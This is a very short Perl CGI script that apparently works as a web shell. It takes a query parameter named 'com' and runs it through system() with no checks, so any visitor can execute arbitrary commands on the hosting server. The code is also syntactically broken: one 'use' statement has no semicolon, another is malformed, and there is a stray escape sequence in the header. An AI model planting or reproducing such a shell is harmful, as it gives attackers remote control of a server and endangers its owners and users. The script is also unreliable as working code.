#!/usr/bin/perl 
use CGI':standard';
use DBI
print<<here;
content-type:text/html \n\n
<center>
here
$com = param('com');
system($com);
print"
</center>";